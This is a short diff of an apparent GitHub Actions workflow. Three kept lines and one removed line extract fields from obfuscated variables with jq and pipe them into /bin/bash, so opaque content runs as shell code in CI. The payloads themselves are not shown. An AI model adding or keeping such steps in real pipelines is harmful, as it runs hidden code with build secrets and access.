@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$klnf645" | jq -r .wor793 | /bin/bash
           echo $ploma495 | jq -r .cwa526 | /bin/bash
           echo $cev370 | jq -r .ppzj6357 | /bin/bash
-          printf '%s' "$pg0" | jq -r .fivlg0430 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
